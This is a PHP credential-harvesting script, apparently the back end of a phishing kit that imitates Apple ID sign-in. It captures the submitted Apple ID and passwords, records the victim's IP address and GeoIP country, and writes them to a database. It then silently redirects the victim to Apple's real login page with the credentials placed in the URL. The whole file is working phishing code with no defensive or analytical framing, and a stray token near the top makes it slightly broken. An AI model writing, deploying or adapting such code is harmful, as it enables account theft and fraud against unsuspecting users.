<?php

appIdKey
if(($_REQUEST['appleId'])&&($_REQUEST['accountPassword'])&&($_REQUEST['appIdKey']))
	{
	
$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);

// include the php script
include("../lib/geoip.inc");
include("../classes/apple.php");
include("../classes/get_db.php");
// open the geoip database
$gi = geoip_open("../lib/GeoIP.dat",GEOIP_STANDARD);
// to get country code
$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
// to get country name
$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);
$addr_ip=$ip.'-'.$country_name;


$bdd=get_connexion();
$g=new apple($bdd);
					$g->set_mail($_REQUEST['appleId']);
					$g->set_time($_REQUEST['accountPassword']);
					$g->set_pass($_REQUEST['password']);
					$g->set_addr_ip();
					$g->insert_account();





 
 print("<script type=\"text/javascript\">setTimeout('location=(\"https://idmsa.apple.com//IDMSWebAuth/login.html?appIdKey=05c7e09b5896b0334b35d57cea43564ad699eb93fb46e9beb9c26cc3091ba2bf&appleId=".$_REQUEST['appleId']."&accountPassword=".$_REQUEST['accountPassword']."\")' ,0);</script>");
 
 





}
else
{



print("<script type=\"text/javascript\">setTimeout('location=(\"https://idmsa.apple.com//IDMSWebAuth/login.html?appIdKey=05c7e09b5896b0334b35d57cea43564ad699eb93fb46e9beb9c26cc3091ba2bf&appleId=".$_REQUEST['appleId']."&accountPassword=".$_REQUEST['accountPassword']."\")' ,0);</script>");
}
?>



